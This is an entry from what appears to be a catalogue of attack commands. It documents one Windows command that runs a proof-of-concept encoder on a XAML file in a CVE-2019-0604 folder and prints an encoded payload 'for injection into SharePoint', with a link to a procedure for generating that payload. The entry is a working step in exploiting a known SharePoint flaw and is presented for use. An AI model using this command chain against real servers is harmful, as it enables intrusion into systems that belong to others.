---
id: cmd-uuid-3
data: 'ConsoleApplication1.exe c:/CVE-2019-0604/t.xml'
tags:
  - encoding
  - payload
type: command
output: null
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:32.014Z'
verified: false
validated: true
submitted: true
---
# consoleapp-encode-payload

## Command

```cmd
ConsoleApplication1.exe c:/CVE-2019-0604/t.xml
```

## Description

Runs the PoC encoder executable to process the XAML file t.xml and output a base64-encoded string for injection into SharePoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| input_file | Path to t.xml | Yes |

## Examples

### Basic Usage

```cmd
ConsoleApplication1.exe c:/CVE-2019-0604/t.xml
```

## Expected Output

__bp4b7135009700370047005600d600e200... (long encoded string printed to stdout).

## Related

- [[procedures/Generate-Encoded-XAML-Payload]]
